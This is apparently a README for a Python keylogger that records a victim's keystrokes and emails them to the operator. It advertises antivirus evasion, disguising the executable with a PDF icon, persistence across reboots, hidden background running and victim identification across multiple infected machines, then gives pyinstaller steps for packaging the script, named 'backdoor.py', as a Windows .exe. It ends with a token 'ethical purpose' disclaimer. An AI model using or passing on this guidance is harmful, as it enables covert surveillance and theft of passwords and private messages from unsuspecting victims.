## As the name suggests, its an application which taps into victim's keyboard.

### It will keep a track of all the buttons pressed on a keyboard and send you updates via mail.

### Features:
Its an .exe file and will by pass most of the antivirus.
You can put any icon on this exe file. PDF file icon would look cool.
Even if the file is stopped from Task manager, it will pick up itself on next reboot.
The file completely runs in background.
The file first sends you the name of victim's computer. So incase you have deployed it in multiple systems, you can know where the text is coming from.

To change this code into .exe file:

.PY to .EXE - converting .py file to .exe( runs on any windows , doesn't require python)
module required: pyinstaller. 
open command prompt, type pyinstaller yourfilenamewith extension --onefile eg: pyinstaller backdoor.py --onefile

A 'dist' named folder will be created and you will find your .exe file inside it.


### NOTE: THIS SHOULD BE USED ONLY FOR ETHICAL PURPOSE.
